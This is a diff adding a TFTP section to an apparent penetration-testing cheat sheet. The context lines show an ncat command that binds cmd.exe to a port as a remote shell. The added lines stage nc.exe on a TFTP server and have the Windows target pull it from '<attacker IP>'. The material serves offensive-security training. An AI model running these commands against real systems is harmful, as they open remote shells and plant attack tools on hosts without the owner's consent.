@@ -30,6 +30,15 @@ Windows           ncat -nlvp 4444 -e cmd.exe --allow 192.168.2.10 --ssl
 Linux             ncat -nv 192.168.2.12 4444 --ssl
 ------------------------------------------------------------------------------------------------------
 
+# TFTP
+
+mkdir /tftp                                      Create a new home folder for tftp
+atftpd --daemon --port 69 /tftp                  Start tftp and assign home folder
+netstat -anup | grep atftp                       Verify the service is running
+cp /usr/share/windows-binaries/nc.exe /tftp/
+tftp -i <attacker IP> get nc.exe                 Run from Windows
+------------------------------------------------------------------------------------------------------
+
 # Wireshark
 
 Capture > Interfaces > choose your interface.
